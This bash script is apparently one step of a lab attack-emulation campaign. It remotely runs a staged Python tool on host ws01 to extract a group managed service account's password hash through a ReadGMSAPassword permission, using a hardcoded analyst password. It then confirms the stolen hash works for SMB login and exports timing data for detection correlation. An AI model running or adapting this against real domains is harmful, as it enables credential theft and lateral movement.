#!/usr/bin/env bash
# T024 — gMSA extraction from ws01 (ACE#10 ReadGMSAPassword as eng_cloud in-process)
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../lib/campaign-a-common.sh"

CASE_ID="CADRE-T024-GMSA-${CASE_DATE:-$(date -u +%Y%m%d)}"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
echo "=== T024 gMSA extraction | ${CASE_ID} | T0=${T0} ==="

campaign_stage_file t024-gmsa-extract.py
OUT="$(ws01_exec_as analyst_t1 'T13r_An@lyst!' 'python C:\Tools\cadre-attack\t024-gmsa-extract.py')"
printf '%s\n' "${OUT}"
campaign_require_ok T024 "${OUT}" 'NTHASH|SMB_AUTH_OK|T024_OK'

cadre_export "${CASE_ID}" T024 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "=== T024 run complete ==="
